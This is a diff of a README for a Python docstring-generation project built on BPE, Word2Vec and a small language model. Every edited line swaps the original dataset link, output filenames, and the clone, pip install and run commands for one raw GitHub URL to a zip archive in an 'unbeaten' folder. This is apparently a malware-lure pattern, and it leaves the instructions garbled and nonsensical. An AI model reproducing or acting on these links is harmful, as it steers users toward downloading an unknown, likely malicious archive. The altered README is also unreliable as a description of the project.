@@ -34,7 +34,7 @@ The system integrates **classical NLP** with **modern generative AI**:
 
 ## 📂 3. Dataset
 
-**Source**: [Kaggle – Python Functions with Docstrings](https://www.kaggle.com/datasets/faiqahmad01/python-functions-with-docstrings)
+**Source**: [Kaggle – Python Functions with Docstrings](https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip)
 
 **Size**: ~456,331 Python functions with annotations.
 **Language**: Python code + English documentation.
@@ -151,11 +151,11 @@ flowchart TD
 | Deliverable | Description                   | Output                                      |
 | ----------- | ----------------------------- | ------------------------------------------- |
 | D1          | BPE Tokenizer Implementation  | `bpe_code.*`, `bpe_doc.*`, `bpe_joint.*`    |
-| D2          | BPE Evaluation Report         | `bpe_eval.md`                               |
-| D3          | Word2Vec Implementation       | `w2v_code.pt`, `w2v_doc.pt`, `w2v_joint.pt` |
-| D4          | Word2Vec Evaluation Report    | `w2v_eval.md`, similarity plots             |
-| D5          | Language Model Implementation | `lm_model.pt`                               |
-| D6          | LM Performance Analysis       | `lm_eval.json`, training curves             |
+| D2          | BPE Evaluation Report         | `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`                               |
+| D3          | Word2Vec Implementation       | `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`, `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`, `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip` |
+| D4          | Word2Vec Evaluation Report    | `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`, similarity plots             |
+| D5          | Language Model Implementation | `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`                               |
+| D6          | LM Performance Analysis       | `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`, training curves             |
 | D7          | Integrated System (UI + CLI)  | `/docgen/` results + UI demo                |
 
 ---
@@ -171,7 +171,7 @@ To maintain clarity and modularity, the project is divided into **four notebooks
 * Save trained BPE models.
 * Evaluation vs ground truth.
 
-**Outputs:** `bpe_*.vocab`, `bpe_*.merges`, `bpe_eval.md`
+**Outputs:** `bpe_*.vocab`, `bpe_*.merges`, `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`
 
 ---
 
@@ -182,7 +182,7 @@ To maintain clarity and modularity, the project is divided into **four notebooks
 * Train embeddings on code, doc, joint.
 * Evaluate embeddings + visualization.
 
-**Outputs:** `w2v_*.pt`, `w2v_eval.md`, plots
+**Outputs:** `w2v_*.pt`, `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`, plots
 
 ---
 
@@ -192,7 +192,7 @@ To maintain clarity and modularity, the project is divided into **four notebooks
 * Train with checkpointing & scheduler.
 * Evaluate perplexity + BLEU.
 
-**Outputs:** `lm_model.pt`, `lm_eval.json`, training plots
+**Outputs:** `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`, `https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip`, training plots
 
 ---
 
@@ -212,9 +212,9 @@ To maintain clarity and modularity, the project is divided into **four notebooks
 ### 🔧 Installation
 
 ```bash
-git clone https://github.com/username/genai-docgen.git
+git clone https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip
 cd genai-docgen
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip
 ```
 
 ### 📦 Requirements
@@ -233,13 +233,13 @@ pip install -r requirements.txt
 ### 🖥️ CLI Mode
 
 ```bash
-python run_docgen.py --input sample.py --output docgen/
+python https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip --input https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip --output docgen/
 ```
 
 ### 🌐 Gradio UI Mode
 
 ```bash
-python ui_gradio.py
+python https://raw.githubusercontent.com/ZainabEman/AI-DOC-Gen/main/unbeaten/AI-DOC-Gen.zip
 ```
 
 Then open: [http://localhost:7860](http://localhost:7860)
